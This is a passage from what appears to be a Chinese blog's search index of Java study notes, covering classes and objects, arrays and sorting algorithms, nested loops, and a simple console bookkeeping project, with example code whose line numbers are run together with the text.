关闭(冰箱)&#123; 冰箱.闭合(); &#125; &#125;冰箱&#123; 开开()&#123;&#125; 闭合()&#123;&#125; &#125;大象&#123; 进入(冰箱)&#123; &#125;&#125; 3. 面向对象的两个要素： 类：对一类事物的描述，是抽象的、概念上的定义对象：是实际存在的该类事物的每个个体，因而也称为实例(instance)面向对象程序设计的重点是类的设计。设计类，就是设计类的成员。 4. 类和对象的使用 创建类，设计类的成员 属性 &#x3D; 成员变量 &#x3D; field &#x3D; 域、字段 方法 &#x3D; 成员方法 &#x3D; 函数 &#x3D; method 创建类的对象 &#x3D; 类的实例化 &#x3D; 实例化类 创建类的对象 通过“对象.属性”或“对象.方法”调用对象的结构 如果创建了一个类的多个对象，则每个对象都独立的拥有一套类的属性。（非 static 的）意味着：如果我们修改一个对象的属性 a，则不影响另外一个对象属性 a 的值。 java 代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546package com.atguigu.java;public class PersonTest &#123; public static void main(String[] args) &#123; //2. 创建Person类的对象 Person p1 = new Person(); //调用对象的结构：属性、方法 //调用属性：“对象.属性” p1.name = &quot;Tom&quot;; p1.isMale = true; System.out.println(p1.name); //调用方法：“对象.方法” p1.eat(); p1.talk(&quot;中文&quot;); Person p2 = new Person(); System.out.println(p2.name); //null System.out.println(p2.isMale); //false //将p1变量保存的对象地址值赋给p3,导致p1和p3指向了堆空间中的同一个对象实体。 Person p3 = p1; System.out.println(p3.name); //Tom p3.age = 10; System.out.println(p1.age); //10 &#125;&#125;//1.创建类，设计类的成员class Person&#123; String name; int age = 1; boolean isMale; public void eat() &#123; System.out.println(&quot;eat&quot;); &#125; public void sleep() &#123; System.out.println(&quot;sleep&quot;); &#125; public void talk(String language) &#123; System.out.println(&quot;说的是&quot; + language); &#125;&#125; 5. 类中属性的使用属性（成员变量） vs 局部变量 相同点： 定义变量的格式：数据类型 变量名 &#x3D; 变量值 先声明，后使用 变量都有其对应的作用域 不同点： 在类中声明的位置的不同 属性：直接定义在类的一对{}内局部变量：声明在方法内、方法形参、代码块内、构造器形参、构造器内部的变量 关于权限修饰符的不同 属性：可以在声明属性时，指明其权限，使用权限修饰符。常用的权限修饰符：private、public、缺省(default)、protected —&gt;封装性。缺省常用。局部变量：不可以使用权限修饰符。 默认初始化值的情况： 属性：类的属性，根据其类型，都有默认初始化值。 整型（byte、short、int、long）：0 浮点型（float、double）：0.0 字符型（char）：0 （或’\\u0000’） 布尔型（boolean）：false 引用数据类型（类、数组、接口）：null 局部变量：没有默认初始化值。 意味着，我们在调用局部变量之前，一定要显式赋值。 特别地：形参在调用时，我们赋值即可。 在内存中加载的位置： 属性：加载到堆空间中 （非 static） 局部变量：加载到栈空间 6. 类中方法的声明和使用1. 方法：描述类应该具有的功能。 比如：Math 类：sqrt()\\random() ...Scanner 类：nextXxx() …Arrays 类：sort() \\ binarySearch() \\ toString() \\ equals() \\ … 下面是自己写的类：public void eat(){}public void sleep(int hour){}public String getName(){}public String getNation(String nation){} 2. 方法的声明：123权限修饰符 返回值类型 方法名(形参列表)&#123; 方法体 &#125; 注意：static、final、abstract 来修饰的方法 3. Tip 关于权限修饰符：默认方法的权限修饰符先都使用 public。Java 规定的 4 种权限修饰符：private、public、缺省、protected 返回值类型： 有返回值 vs 没有返回值 如果方法有返回值，则必须在方法声明时，指定返回值的类型。并用 return 关键字来返回指定类型的变量或常量：“return 数据”。如果方法没有返回值，用 void 来表示。通常，没有返回值则不需要使用 return.但是，如果使用的话，只能“return;”表示结束此方法的意思。 我们定义方法该不该有返回值？ 题目要求 凭经验 方法名：属于标识符，遵循标识符的规则和规范，“见名知意” 形参列表： 方法可以声明 0 个，1 个，或多个形参。 格式：数据类型 1 形参 1,数据类型 2 形参 2,… 我们定义方法时，该不该定义形参？ 题目要求 凭经验 方法体：方法功能的体现。 return 关键字的使用： 使用范围：使用在方法体中 作用： 结束方法 针对于有返回值类型的方法，使用”return 数据”方法返回所要的数据。 注意点：return 关键字后面不可以声明执行语句。 方法的使用中，可以调用当前类的属性或方法特殊的：方法 A 中又调用了方法 A:递归方法。方法中，不可以定义方法。 可以直接在同一个包下面定义自己的类，名字尾缀为 java，最开始不需要 import 123456789101112131415161718192021package com.atguigu.exer;public class Person &#123; String name; int age; /** * sex:1 表明是男性 * sex:0 表明是女性 */ int sex; public void study()&#123; System.out.println(&quot;studying&quot;); &#125; public void showAge()&#123; System.out.println(&quot;age:&quot; + age); &#125; public int addAge(int i)&#123; age += i; return age; &#125;&#125; 12345678910111213141516171819202122232425262728293031package com.atguigu.exer;/* * 要求： * (1)创建Person类的对象，设置该对象的name、age和sex属性，调用study方法， * 输出字符串“studying”，调用showAge()方法显示age值， * 调用addAge()方法给对象的age属性值增加2岁。 * (2)创建第二个对象，执行上述操作，体会同一个类的不同对象之间的关系。 */public class PersonTest &#123; public static void main(String[] args) &#123; Person p1 = new Person(); p1.name = &quot;Tom&quot;; p1.age = 18; p1.sex = 1; p1.study(); p1.showAge(); int newAge = p1.addAge(2); System.out.println(p1.name + &quot;的新年龄为：&quot; + newAge); System.out.println(p1.age); //20 Person p2 = new Person(); p2.showAge(); //0 p2.addAge(10); p2.showAge(); //10 &#125;&#125; 4. java 代码12345678910111213141516171819202122232425262728293031323334353637package com.atguigu.java;public class CustomerTest &#123; public static void main(String[] args) &#123; Customer cust1 = new Customer(); //cust1.eat(); 报错 cust1.sleep(8); &#125;&#125;class Customer&#123; String name; int age; boolean isMale; private void eat()&#123; System.out.println(&quot;客户吃饭&quot;); &#125; public void sleep(int hour)&#123; System.out.println(&quot;休息了&quot; + hour + &quot;个小时&quot;); eat(); &#125; public String getName()&#123; if (age &gt; 18)&#123; return name; &#125;else &#123; return &quot;Tom&quot;; &#125; &#125; public String getNation(String nation)&#123; String info = &quot;国籍为&quot; + nation; return info; &#125;&#125; 123456789101112131415161718192021222324252627package com.atguigu.java;public class UserTest &#123; public static void main(String[] args) &#123; User u1 = new User(); System.out.println(u1.name); System.out.println(u1.age); System.out.println(u1.isMale); u1.talk(&quot;汉语&quot;); u1.eat(); &#125;&#125;class User&#123; //属性（或成员变量） String name; public int age; boolean isMale; public void talk(String language)&#123; //局部变量 System.out.println(&quot;我们用&quot; + language); &#125; public void eat()&#123; String food = &quot;饼&quot;; //局部变量 System.out.println(&quot;一个&quot; + food); &#125;&#125; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677package com.atguigu.exer;public class StudentTest1 &#123; public static void main(String[] args) &#123; Student1[] s1 = new Student1[20]; for (int i = 0; i &lt; s1.length; i++) &#123; s1[i] = new Student1(); s1[i].number = (i + 1); //年级：[1,6] s1[i].state = (int)(Math.random() * (6 - 1 + 1) + 1); //成绩：[0,100] s1[i].score = (int) (Math.random() * (100 - 0 + 1)); &#125; StudentTest1 test = new StudentTest1(); test.print(s1); System.out.println(); test.seacchState(s1, 3); System.out.println(); test.sort(s1); test.print(s1); &#125; /** * 遍历学生数组 * @param s1 */ public void print(Student1[] s1)&#123; for (int i = 0; i &lt; s1.length; i++) &#123; System.out.println(s1[i].info()); &#125; &#125; /** *问题一：打印出指定年级的学生信息。 * @param s1 要查找的数组 * @param state 要查找的年级 */ public void seacchState(Student1[] s1, int state)&#123; for (int i = 0; i &lt; s1.length; i++) &#123; if (s1[i].state == state)&#123; System.out.println(s1[i].info()); &#125; &#125; &#125; /** * 使用冒泡排序按学生成绩排序 * @param s1 */ public void sort(Student1[] s1)&#123; for (int i = 0; i &lt; s1.length - 1; i++) &#123; for (int j = 0; j &lt; s1.length - 1 - i; j++) &#123; if (s1[j].score &gt; s1[j + 1].score)&#123; //注意这里交换的是对象 Student1 temp = s1[j]; s1[j] = s1[j + 1]; s1[j + 1] = temp; &#125; &#125; &#125; &#125;&#125;class Student1&#123; int number;; //学号 int state; //年级 int score; //成绩 //显示学生信息 public String info()&#123; return &quot;学号：&quot; + number + &quot;,年级：&quot; + state + &quot;,成绩：&quot; + score; &#125;&#125;","tags":["Java","学习笔记","基础","类","面向对象"],"categories":["Java学习笔记"]},{"title":"java学习笔记8","path":"//coding/java/note/8.html","content":"数组常见算法1. 数组元素的赋值(杨辉三角，回文数等)杨辉三角123456789101112131415161718192021222324252627282930package com.atguigu.exer;/*使用二维数组打印一个 10 行杨辉三角。【提示】 1. 第一行有 1 个元素, 第 n 行有 n 个元素 2. 每一行的第一个元素和最后一个元素都是 1 3. 从第三行开始, 对于非第一个元素和最后一个元素的元素。即：yanghui[i][j] = yanghui[i-1][j-1] + yanghui[i-1][j]; */public class YangHuiTest &#123; public static void main(String[] args) &#123; //1.声明并初始化二维数组 int[][] yangHui = new int[10][]; //2.给数组的元素赋值 for (int i = 0; i &lt; yangHui.length; i++) &#123; yangHui[i] = new int[i + 1]; //2.1 给首末元素赋值 yangHui[i][0] = yangHui[i][i] = 1; //2.2 给每行的非首末元素赋值 for (int j = 1; j &lt; yangHui[i].length - 1; j++) &#123; yangHui[i][j] = yangHui[i-1][j-1] + yangHui[i-1][j]; &#125; //3.遍历二维数组 for (int j = 0; j &lt; yangHui[i].length; j++) &#123; System.out.print(yangHui[i][j] + &quot;\\t&quot;); &#125; System.out.println(); &#125; &#125;&#125; 2. 求数值型数组中元素的最大值、最小值、平均数、总和等123456789101112131415161718192021222324252627282930313233343536373839404142package com.atguigu.java;public class ArrayTest1 &#123; public static void main(String[] args) &#123; int [] arr = new int[10]; for (int i = 0; i &lt; arr.length; i++) &#123; arr[i] = (int) (Math.random() * (99 -10 + 1) + 10); &#125; //遍历 for(int i = 0;i &lt; arr.length;i++)&#123; System.out.print(arr[i] + &quot;\\t&quot;); &#125; System.out.println(); //求数组元素的最大值 int maxValue = arr[0]; for (int i = 1; i &lt; arr.length; i++) &#123; if (maxValue &lt; arr[i])&#123; maxValue = arr[i]; &#125; &#125; System.out.println(&quot;最大值为：&quot; + maxValue); //求数组元素的最小值 int minValue = arr[0]; for (int i = 1; i &lt; arr.length; i++) &#123; if (minValue &gt; arr[i])&#123; minValue = arr[i]; &#125; &#125; System.out.println(&quot;最小值为：&quot; + minValue); //求数组元素的总和 int sum = 0; for (int i = 0; i &lt; arr.length; i++) &#123; sum += arr[i]; &#125; System.out.println(&quot;总和为：&quot; + sum); //求数组元素的平均数 int avgValue = sum / arr.length; System.out.println(&quot;平均数为：&quot; + avgValue); &#125;&#125; 3. 数组的复制、反转、查找(线性查找、二分法查找)123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869package com.atguigu.java;public class ArrayTest2 &#123; public static void main(String[] args) &#123; String[] arr = new String[]&#123;&quot;JJ&quot;,&quot;DD&quot;,&quot;MM&quot;,&quot;BB&quot;,&quot;GG&quot;,&quot;AA&quot;&#125;; //数组的复制 String[] arr1 = new String[arr.length]; for (int i = 0; i &lt; arr1.length; i++) &#123; arr1[i] = arr[i]; &#125; //数组的反转 for (int i = 0; i &lt; arr.length / 2; i++) &#123; String temp = arr[i]; arr[i] = arr[arr.length - i - 1]; arr[arr.length - i - 1] = temp; &#125; for (int i = 0, j = arr.length - 1; i &lt; j; i++, j--) &#123; String temp = arr[i]; arr[i] = arr[j]; arr[j] = temp; &#125; //遍历 for(int i = 0;i &lt; arr.length;i++)&#123; System.out.print(arr[i] + &quot;\\t&quot;); &#125; System.out.println(); //查找 //线性查找 String dest = &quot;BB&quot;; dest = &quot;CC&quot;; boolean isFlag = true; for (int i = 0; i &lt; arr.length; i++) &#123; if (dest.equals(arr[i]))&#123; System.out.println(&quot;位置为：&quot; + i); isFlag = false; break; &#125; &#125; if (isFlag)&#123; System.out.println(&quot;没找到&quot;); &#125; //二分法查找，效率高 //前提：所要查找的数组必须有序。 int [] arr2 =new int[]&#123;-98,-34,2,34,54,66,79,105,210,333&#125;; int dest1 = -34; dest1 = 35; int head_index = 0; //初始的首索引 int end_index = arr2.length - 1; //初始的末索引 boolean isFlag1 = true; while (head_index &lt;= end_index)&#123; int middle_index = (head_index + end_index) / 2; if (dest1 == arr2[middle_index])&#123; System.out.println(&quot;位置为：&quot; + middle_index); isFlag = false; break; &#125;else if(arr2[middle_index] &gt; dest1)&#123; end_index = middle_index- 1 ; &#125;else &#123; head_index = middle_index + 1; &#125; &#125; if (isFlag)&#123; System.out.println(&quot;没找到&quot;); &#125; &#125;&#125; 4. 排序算法1. 衡量排序算法的优劣： 时间复杂度：分析关键字的比较次数和记录的移动次数 空间复杂度：分析排序算法中需要多少辅助内存 稳定性：若两个记录 A 和 B 的关键字值相等，但排序后 A、B 的先后次序保持不变，则称这种排序算法是稳定的。 2. 排序算法分类：内部排序和外部排序。 内部排序：整个排序过程不需要借助于外部存储器（如磁盘等），所有排序操作都在内存中完成。 外部排序：参与排序的数据非常多，数据量非常大，计算机无法把整个排序过程放在内存中完成，必须借助于外部存储器（如磁盘）。外部排序最常见的是多路归并排序。可以认为外部排序是由多次内部排序组成。 3. 十大内部排序算法 选择排序 直接选择排序 堆排序 交换排序 冒泡排序 快速排序 插入排序 直接插入排序 折半插入排序 Shell 排序 归并排序 桶式排序 基数排序 4. 算法的 5 大特征 输入（Input）：有 0 个或多个输入数据，这些输入必须有清楚的描述和定义 输出（Output）：至少有 1 个或多个输出结果，不可以没有输出结果 有穷性（有限性，Finiteness）：算法在有限的步骤之后会自动结束而不会无限循环，并且每一个步骤可以在可接受的时间内完成 确定性（明确性，Definiteness）：算法中的每一步都有确定的含义，不会出现二义性 可行性（有效性，Effectiveness）：算法的每一步都是清楚且可行的，能让用户用纸笔计算而求出答案 5. java 代码1234567891011121314151617181920// 冒泡排序package com.atguigu.java;public class BubbleSortTest &#123; public static void main(String[] args) &#123; int [] arr = new int[] &#123;43,32,76,-98,0,64,33,-21,32,99&#125;; for(int i = 0;i &lt; arr.length - 1;i++)&#123; for(int j = 0;j &lt; arr.length - 1 - i;j++)&#123; if(arr[j] &gt; arr[j + 1])&#123; int temp = arr[j]; arr[j] = arr[j + 1]; arr[j + 1] = temp; &#125; &#125; &#125; for (int i = 0; i &lt; arr.length; i++) &#123; System.out.print(arr[i] + &quot;\\t&quot;); &#125; &#125;&#125; 1234567891011121314151617181920212223242526272829303132333435363738394041424344// 快速排序package com.atguigu.java;public class QuickSort &#123; private static void swap(int[] data, int i, int j) &#123; int temp = data[i]; data[i] = data[j]; data[j] = temp; &#125; private static void subSort(int[] data, int start, int end) &#123; if (start &lt; end) &#123; int base = data[start]; int low = start; int high = end + 1; while (true) &#123; while (low &lt; end &amp;&amp; data[++low] - base &lt;= 0) ; while (high &gt; start &amp;&amp; data[--high] - base &gt;= 0) ; if (low &lt; high) &#123; swap(data, low, high); &#125; else &#123; break; &#125; &#125; swap(data, start, high); subSort(data, start, high - 1);//递归调用 subSort(data, high + 1, end); &#125; &#125; public static void quickSort(int[] data)&#123; subSort(data,0,data.length-1); &#125; public static void main(String[] args) &#123; int[] data = &#123; 9, -16, 30, 23, -30, -49, 25, 21, 30 &#125;; System.out.println(&quot;排序之前： &quot; + java.util.Arrays.toString(data)); quickSort(data); System.out.println(&quot;排序之后： &quot; + java.util.Arrays.toString(data)); &#125;&#125; 5. Arrays 工具类的使用 常用的类 作用 boolean equals(int[] a,int[] b) 判断两个数组是否相等。 String toString(int[] a) 输出数组信息。 void fill(int[] a,int val) 将指定值填充到数组之中。 void sort(int[] a) 对数组进行排序。 int binarySearch(int[] a,int key) 对排序后的数组进行二分法检索指定的值。 java 代码123456789101112131415161718192021222324252627282930313233package com.atguigu.java;import java.util.Arrays;public class ArraysTest &#123; public static void main(String[] args) &#123; //1.boolean equals(int[] a,int[] b) int [] arr1 = new int[]&#123;1,2,3,4&#125;; int [] arr2 = new int[]&#123;1,3,2,4&#125;; boolean isEquals = Arrays.equals(arr1, arr2); System.out.println(isEquals); //false //2.String toString System.out.println(Arrays.toString(arr1)); //[1, 2, 3, 4] //3.void fill(int[] a,int val) Arrays.fill(arr1, 10); System.out.println(Arrays.toString(arr1)); //[10, 10, 10, 10] //4.void sort(int[] a) Arrays.sort(arr2); System.out.println(Arrays.toString(arr2)); //[1, 2, 3, 4] ////5.int binarySearch(int[] a,int key) 要有序 int[] arr3 = new int[]&#123;-98,-34,2,34,54,66,79,105,210,333&#125;; int index = Arrays.binarySearch(arr3, 210); if (index &gt;= 10)&#123; System.out.println(index); &#125;else &#123; System.out.println(&quot;没找到&quot;); &#125; &#125;&#125; 6. 数组使用中的常见异常 数组角标越界的异常：ArrayIndexOutOfBoundsExcetion 空指针异常：NullPointerException java 代码12345678910111213141516171819202122232425package com.atguigu.java;public class ArrayExceptionTest &#123; public static void main(String[] args) &#123; //1. 数组角标越界的异常：ArrayIndexOutOfBoundsExcetion int[] arr = new int[]&#123;1,2,3,4,5&#125;; //System.out.println(arr[5]); //System.out.println(arr[-2]); //2.2. 空指针异常：NullPointerException //情况一 int[] arr1 = new int[]&#123;1, 2, 3&#125;; arr1 = null; //System.out.println(arr1[0]); //情况二 int[][] arr2 = new int[4][]; //System.out.println(arr2[0][0]); 要初始化 //情况三： String[] arr3 = new String[]&#123;&quot;AA&quot;, &quot;BB&quot;, &quot;CC&quot;&#125;; //arr3[0] = null; System.out.println(arr3[0].toString()); &#125;&#125;","tags":["Java","学习笔记","基础","数组","算法"],"categories":["Java学习笔记"]},{"title":"java学习笔记7","path":"//coding/java/note/7.html","content":"1. 数组1. 概念 数组(Array)，是多个相同类型数据按一定顺序排列的集合，并使用一个名字命名，并通过编号的方式对这些数据进行统一管理 2. 组成 数组名 元素 索引 数组的长度：元素的个数 3. 特点 数组是有序排列的 数组属于引用数据类型的变量。数组的元素，既可以是基本数据类型，也可以是引用数据类型 创建数组对象会在内存中开辟一整块连续的空间 数组的长度一旦确定，就不能修改。 4. 数组分类 按照维数：一维数组、二维数组、。。。 按照数组元素的类型：基本数据类型元素的数组、引用数据类型元素的数组 2. 一维数组1. 一维数组的使用 一维数组的声明和初始化 如何调用数组的指定位置的元素 如何获取数组的长度 如何遍历数组 数组元素的默认初始化值 ：见 ArrayTest1.java 数组元素是整型：0数组元素是浮点型：0.0数组元素是 char 型：0 或’\\u0000’，而非’0’数组元素是 boolean 型：false数组元素是引用数据类型：null 数组的内存解析 ：见 ArrayTest1.java 1234567891011121314151617181920212223242526272829package com.atguigu.java;public class ArrayTest &#123; public static void main(String[] args) &#123; //1. 一维数组的声明和初始化 int [] ids;//声明 //1.1 静态初始化:数组的初始化和数组元素的赋值操作同时进行 ids = new int[]&#123;01, 02, 03, 04, 05&#125;; //1.2动态初始化:数组的初始化和数组元素的赋值操作分开进行 String [] names = new String[5]; int[] arr1 = new int[] &#123;1,2,3,4,5&#125;; int[] arr4 = &#123;1,2,3,4,5&#125;;//类型推断 //2.如何调用数组的指定位置的元素:通过角标的方式调用。 names[0] = &quot;00&quot;; names[1] = &quot;11&quot;; names[2] = &quot;22&quot;; names[3] = &quot;33&quot;; names[4] = &quot;44&quot;; //3.如何获取数组的长度。(length) System.out.println(names.length); //4.如何遍历数组 for (int i = 0; i &lt; names.length; i++) &#123; System.out.println(names[i]); &#125; &#125;&#125; 1234567891011121314151617181920212223242526272829303132package com.atguigu.java;public class ArrayTest1 &#123; public static void main(String[] args) &#123; //5.数组元素的默认初始化值 int [] arr = new int[4]; for (int i = 0; i &lt; arr.length; i++) &#123; System.out.println(arr[i]); &#125; short [] arr1 = new short[4]; System.out.println(arr1[0]); float[] arr2 = new float[4]; System.out.println(arr2[0]); char[] arr3 = new char[4]; System.out.println(arr3[0]); //0 if(arr3[0] == 0)&#123; System.out.println(&quot;你好！&quot;); //进来这里 &#125; boolean[] arr4 = new boolean[4]; System.out.println(arr4[0]); String [] arr5 = new String[4]; System.out.println(arr5[0]); //null if(arr5[0] == null)&#123; System.out.println(&quot;北京天气不错！&quot;); //进来这里 &#125; &#125;&#125; 2. 一维数组例题123456789101112131415161718192021222324252627282930313233343536373839404142434445464748/*从键盘读入学生成绩，找出最高分，并输出学生成绩等级。 成绩&gt;=最高分-10 等级为’A’ 成绩&gt;=最高分-20 等级为’B’ 成绩&gt;=最高分-30 等级为’C’ 其余 等级为’D’*/package com.atguigu.exer;import java.util.Scanner;public class ArrayDemo1 &#123; public static void main(String[] args) &#123; //1.使用Scanner，读取学生个数 Scanner scanner = new Scanner(System.in); System.out.println(&quot;学生人数&quot;); int number = scanner.nextInt(); //2.创建数组，存储学生成绩：动态初始化 int[] scores = new int[number]; //3.给数组中的元素赋值 System.out.println(&quot;请输入&quot; + number + &quot;个学生成绩：&quot;); int maxScore = 0; for (int i = 0; i &lt; scores.length; i++) &#123; scores[i] = scanner.nextInt(); //4.获取数组中的元素的最大值:最高分 if (maxScore &lt; scores[i])&#123; maxScore = scores[i]; &#125; &#125; //5.根据每个学生成绩与最高分的差值，得到每个学生的等级，并输出等级和成绩 char level; for (int i = 0; i &lt; scores.length; i++) &#123; if (maxScore - scores[i] &lt;= 10)&#123; level = &#x27;A&#x27;; &#125;else if(maxScore - scores[i] &lt;= 20)&#123; level = &#x27;B&#x27;; &#125;else if(maxScore - scores[i] &lt;= 30)&#123; level = &#x27;C&#x27;; &#125;else&#123; level = &#x27;D&#x27;; &#125; System.out.println(&quot;student&quot; + i + &quot;成绩为&quot; + scores[i] + &quot;等级为&quot; + level); &#125; &#125;&#125; 3. 二维数组1. 二维数组的概念 对于二维数组的理解，我们可以看成是一维数组 array1 又作为另一个一维数组 array2 的元素而存在。其实，从数组底层的运行机制来看，其实没有多维数组 2. 二维数组的使用: 二维数组的声明和初始化 如何调用数组的指定位置的元素 如何获取数组的长度 如何遍历数组 数组元素的默认初始化值 :见 ArrayTest3.java 针对于初始化方式一：比如：int[][] arr &#x3D; new int[4][3];外层元素的初始化值为：地址值内层元素的初始化值为：与一维数组初始化情况相同 针对于初始化方式二：比如：int[][] arr &#x3D; new int[4][];外层元素的初始化值为：null内层元素的初始化值为：不能调用，否则报错。 数组的内存解析 :见 ArrayTest3.java 12345678910111213141516171819202122232425262728293031package com.atguigu.java;public class ArrayTest2 &#123; public static void main(String[] args) &#123; //1.二维数组的声明和初始化 int [][] arr1 = new int [][]&#123;&#123;1, 2, 3&#125;, &#123;4, 5, 6&#125;, &#123;7, 8, 9&#125;&#125;; String [][] arr2 = new String[3][2]; String [][] arr3 = new String[3][]; int arr4 [][] = new int[][]&#123;&#123;1,2,3&#125;,&#123;4,5,9,10&#125;,&#123;6,7,8&#125;&#125;; int[] arr5[] = &#123;&#123;1,2,3&#125;,&#123;4,5&#125;,&#123;6,7,8&#125;&#125;; //2.如何调用数组的指定位置的元素 System.out.println(arr1[0][1]); //2 System.out.println(arr2[1][1]); //null arr3[1] = new String[4]; // System.out.println(arr3[1][0]); //3.获取数组的长度 System.out.println(arr4.length); //3 System.out.println(arr4[0].length); //3 //4.如何遍历二维数组 for (int i = 0; i &lt; arr4.length; i++) &#123; for (int j = 0; j &lt; arr4[i].length; j++) &#123; System.out.print(arr4[i][j] + &quot;\\t&quot;); &#125; System.out.println(); &#125; &#125;&#125; 12345678910111213141516171819202122package com.atguigu.java;public class ArrayTest3 &#123; public static void main(String[] args) &#123; int [][] arr = new int[4][3]; System.out.println(arr); // 内存地址 System.out.println(arr[0]); // 内存地址 System.out.println(arr[0][0]); // 0 float [][] arr1 = new float[4][3]; System.out.println(arr1[0]); // 内存地址 System.out.println(arr1[0][0]); // 0.0 String[][] arr2 = new String[4][3]; System.out.println(arr2[0]); //地址值 System.out.println(arr2[0][0]); //null double[][] arr3 = new double[4][]; System.out.println(arr3[0]); //null //System.out.println(arr3[0][0]); //报错，空指针 &#125;&#125;","tags":["Java","学习笔记","基础","数组"],"categories":["Java学习笔记"]},{"title":"java project 家庭收支记账软件","path":"//coding/java/project/1.html","content":"家庭收支记账软件1. 自己编写的 java 文件FamilyAccount.java12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061//FamilyAccount.javapublic class FamilyAccount &#123; public static void main(String[] args) &#123; boolean isFlag = true; String details = &quot;收支\\t账户金额\\t收支金额\\t说 明 &quot;; int balance = 10000; while (isFlag)&#123; System.out.println(&quot;-----------------家庭收支记账软件----------------- &quot;); System.out.println(&quot; 1 收支明细&quot;); System.out.println(&quot; 2 登记收入&quot;); System.out.println(&quot; 3 登记支出&quot;); System.out.println(&quot; 4 退 出 &quot;); System.out.print(&quot; 请选择(1-4)：&quot;); //获取输入 char selection = Utility.readMenuSelection(); switch (selection)&#123; case &#x27;1&#x27;: //1.收支明细 System.out.println(&quot;-----------------当前收支明细记录-----------------&quot;); System.out.println(details); System.out.println(&quot;--------------------------------------------------&quot;); break; case &#x27;2&#x27;: //2.登记收入 System.out.print(&quot;本次收入金额：&quot;); int addMoney = Utility.readNumber(); System.out.print(&quot;本次收入说明：&quot;); String addInfo = Utility.readString(); balance += addMoney; details += (&quot;收入\\t&quot; + balance + &quot;\\t\\t&quot; + addMoney + &quot;\\t\\t&quot; + addInfo + &quot; &quot;); System.out.println(&quot;---------------------登记完成--------------------- &quot;); break; case &#x27;3&#x27;: //3.登记支出 System.out.print(&quot;本次支出金额：&quot;); int minusMoney = Utility.readNumber(); System.out.print(&quot;本次支出说明：&quot;); String minusInfo = Utility.readString(); if (balance &gt;= minusMoney)&#123; balance -= minusMoney; details += (&quot;支出\\t&quot; + balance + &quot;\\t\\t&quot; + minusMoney + &quot;\\t\\t&quot; + minusInfo + &quot; &quot;); &#125;else &#123; System.out.println(&quot;钱不够，付不了~~~&quot;); &#125; System.out.println(&quot;---------------------登记完成--------------------- &quot;); break; case &#x27;4&#x27;: //4.退 出 System.out.print(&quot;确认是否退出(Y/N)：&quot;); char isExit = Utility.readConfirmSelection(); if (isExit == &#x27;Y&#x27;)&#123; isFlag = false; &#125; break; &#125; &#125; &#125;&#125; 2. 别人写好的工具类Utility.java12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879//Utility.javaimport java.util.Scanner;/** Utility工具类： 将不同的功能封装为方法，就是可以直接通过调用方法使用它的功能，而无需考虑具体的功能实现细节。 */public class Utility &#123; private static Scanner scanner = new Scanner(System.in); /** 用于界面菜单的选择。该方法读取键盘，如果用户键入’1’-’4’中的任意字符，则方法返回。返回值为用户键入字符。 */ public static char readMenuSelection() &#123; char c; for (; ; ) &#123; String str = readKeyBoard(1); c = str.charAt(0); if (c != &#x27;1&#x27; &amp;&amp; c != &#x27;2&#x27; &amp;&amp; c != &#x27;3&#x27; &amp;&amp; c != &#x27;4&#x27;) &#123; System.out.print(&quot;选择错误，请重新输入：&quot;); &#125; else break; &#125; return c; &#125; /** 用于收入和支出金额的输入。该方法从键盘读取一个不超过4位长度的整数，并将其作为方法的返回值。 */ public static int readNumber() &#123; int n; for (; ; ) &#123; String str = readKeyBoard(4); try &#123; n = Integer.parseInt(str); break; &#125; catch (NumberFormatException e) &#123; System.out.print(&quot;数字输入错误，请重新输入：&quot;); &#125; &#125; return n; &#125; /** 用于收入和支出说明的输入。该方法从键盘读取一个不超过8位长度的字符串，并将其作为方法的返回值。 */ public static String readString() &#123; String str = readKeyBoard(8); return str; &#125; /** 用于确认选择的输入。该方法从键盘读取‘Y’或’N’，并将其作为方法的返回值。 */ public static char readConfirmSelection() &#123; char c; for (; ; ) &#123; String str = readKeyBoard(1).toUpperCase(); c = str.charAt(0); if (c == &#x27;Y&#x27; || c == &#x27;N&#x27;) &#123; break; &#125; else &#123; System.out.print(&quot;选择错误，请重新输入：&quot;); &#125; &#125; return c; &#125; private static String readKeyBoard(int limit) &#123; String line = &quot;&quot;; while (scanner.hasNext()) &#123; line = scanner.nextLine(); if (line.length() &lt; 1 || line.length() &gt; limit) &#123; System.out.print(&quot;输入长度（不大于&quot; + limit + &quot;）错误，请重新输入：&quot;); continue; &#125; break; &#125; return line; &#125;&#125;","tags":["Java","基础","项目","工程"],"categories":["Java项目"]},{"title":"java学习笔记6","path":"//coding/java/note/6.html","content":"1. 嵌套循环的使用1. 定义将一个循环结构 A 声明在另一个循环结构 B 的循环体中,就构成了嵌套循环 2. java 代码123456789101112131415161718192021222324252627282930313233343536373839404142public class ForForTest &#123; public static void main(String[] args) &#123; for (int i = 0; i &lt; 5; i++) &#123; System.out.print(&quot;*&quot;); &#125; System.out.println(&#x27; &#x27;); for (int j = 0; j &lt; 4; j++) &#123; for (int i = 0; i &lt; 5; i++) &#123; System.out.print(&quot;*&quot;); &#125; System.out.println(); &#125; /* i(行号) j(*的个数) * 1 1 ** 2 2 *** 3 3 **** 4 4 ***** 5 5 */ for (int i = 0; i &lt; 5; i++) &#123; for (int j = 0; j &lt;= i; j++) &#123; System.out.print(&quot;*&quot;); &#125; System.out.println(); &#125; /* i(行号) j(*的个数) 规律：i + j = 5 换句话说：j = 5 - i; **** 1 4 *** 2 3 ** 3 2 * 4 1 */ for (int i = 0; i &lt; 4; i++) &#123; for (int j = 0; j &lt; 4 - i; j++) &#123; System.out.print(&quot;*&quot;); &#125; System.out.println(); &#125; &#125;&#125; 3. Tip 内层遍历一遍，相当于外层循环一次 假设外层循环执行 m 次，内层循环执行 n 次。此时内层循环的循环体一共执行了 m * n 次 4. 九九乘法表12345678910public class NineNineTable &#123; public static void main(String[] args) &#123; for (int i = 1; i &lt;= 9; i++) &#123; for (int j = 1; j &lt;= i; j++) &#123; System.out.print(i + &quot;*&quot; + j + &quot;=&quot; + (i * j) + &quot;\\t&quot;); &#125; System.out.println(); &#125; &#125;&#125; 2. break,continue,label 的基本使用1. break,continue 的基本使用 break 和 continue 使用范围 循环中使用的作用(不同点) 相同点 break: switch-case 循环结构中 结束当前循环 关键字后面不能声明执行语句 continue: 循环结构中 结束当次循环 关键字后面不能声明执行语句 2. java 代码12345678910111213141516171819202122232425262728293031323334public class BreakContinueTest &#123; public static void main(String[] args) &#123; for(int i 